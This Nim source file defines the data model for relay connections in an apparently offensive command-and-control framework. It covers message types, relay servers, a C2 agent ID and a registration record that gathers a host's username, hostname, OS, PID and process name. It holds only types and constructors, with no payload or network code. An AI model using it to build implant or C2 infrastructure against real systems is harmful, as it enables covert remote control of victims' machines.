#[
    Domain Model: RelayConnection
    Represents relay connection configuration and state
]#

import times

type
    RelayMessageType* = enum
        REGISTRATION
        CONFIRMATION
        CONFIRMATION_ACK
        COMMAND
        FORWARD
        HTTP_REQUEST
        HTTP_RESPONSE
    
    RelayMessage* = object
        msgType*: RelayMessageType
        payload*: string
        fromID*: string
    
    RelayConnection* = object
        isConnected*: bool
        connectionId*: string
    
    RelayServer* = object
        isListening*: bool
        port*: int
        serverId*: string
    
    RelayRegistration* = object
        clientId*: string
        localIP*: string
        username*: string
        hostname*: string
        osInfo*: string
        pid*: int
        processName*: string
        timestamp*: int64
    
    HttpRelayConfig* = object
        gatewayHost*: string
        gatewayPort*: int
        relayClientId*: string        # Temporary relay connection ID
        cumulusAgentId*: string       # Real C2-assigned agent ID
        isConnected*: bool
        isRegistered*: bool           # Whether registered with C2

proc newRelayConnection*(): RelayConnection =
    ## Create a new disconnected RelayConnection
    result = RelayConnection(
        isConnected: false,
        connectionId: ""
    )

proc newRelayServer*(port: int, serverId: string = ""): RelayServer =
    ## Create a new RelayServer instance
    result = RelayServer(
        isListening: false,
        port: port,
        serverId: serverId
    )

proc newRelayRegistration*(clientId: string, localIP: string, username: string, 
                          hostname: string, osInfo: string, pid: int, 
                          processName: string): RelayRegistration =
    ## Create a new RelayRegistration instance
    result = RelayRegistration(
        clientId: clientId,
        localIP: localIP,
        username: username,
        hostname: hostname,
        osInfo: osInfo,
        pid: pid,
        processName: processName,
        timestamp: epochTime().int64
    )

proc newHttpRelayConfig*(gatewayHost: string, gatewayPort: int, relayClientId: string): HttpRelayConfig =
    ## Create a new HttpRelayConfig instance
    result = HttpRelayConfig(
        gatewayHost: gatewayHost,
        gatewayPort: gatewayPort,
        relayClientId: relayClientId,
        cumulusAgentId: "",
        isConnected: false,
        isRegistered: false
    )

proc createMessage*(msgType: RelayMessageType, fromId: string, payload: string): RelayMessage =
    ## Create a new RelayMessage instance
    result = RelayMessage(
        msgType: msgType,
        payload: payload,
        fromID: fromId
    )

